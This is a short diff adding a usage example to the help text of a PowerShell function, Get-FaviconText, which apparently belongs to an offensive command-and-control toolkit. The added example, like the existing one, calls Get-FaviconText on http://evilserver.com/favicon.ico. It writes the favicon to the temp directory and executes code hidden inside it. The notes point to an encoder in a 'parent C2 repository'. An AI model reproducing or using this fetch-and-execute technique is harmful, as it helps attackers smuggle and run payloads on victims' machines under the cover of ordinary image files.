@@ -25,6 +25,12 @@ function Get-FaviconText
     -----------
     Download a favicon from evilserver.com, write it to your temp directory, and execute the code within.
     
+    .EXAMPLE
+    C:\PS> Get-FaviconText http://evilserver.com/favicon.ico $env:TEMP
+    Description
+    -----------
+    Download a favicon from evilserver.com, write it to your temp directory, and execute the code within. (using positional args)
+    
     .NOTES
     Favicons must be encoded using the python sister code in the parent C2 repository.
    
